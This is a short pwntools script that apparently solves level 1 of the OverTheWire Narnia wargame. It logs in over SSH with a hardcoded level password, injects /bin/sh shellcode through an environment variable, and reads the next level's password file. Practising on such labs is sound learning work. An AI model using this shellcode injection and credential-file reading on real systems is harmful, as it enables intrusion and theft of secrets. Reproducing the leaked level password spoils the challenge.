#!/usr/bin/env python2

from pwn import *
import time

host = 'narnia.labs.overthewire.org'
level = 1
binary = '/narnia/narnia%i' % level
user = 'narnia%i' % level
passfile = '/etc/narnia_pass/narnia%i' % (level+1)

shell = ssh(host=host, user=user, password="efeidiedae") #connects to the server

#shellcode to spawn /bin/sh
payload = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"

sh = shell.process(binary, env= {"EGG" : payload}) #runs the binary 
print sh.recvline()

time.sleep(2) #sleep to give the program time to crash properly due to potential lag

sh.sendline('id') #run id on the host
log.success('id: ' + sh.recvline().strip())

sh.sendline('cat %s' % passfile) # get the password for the level
log.success('password: ' + sh.recvline().strip())
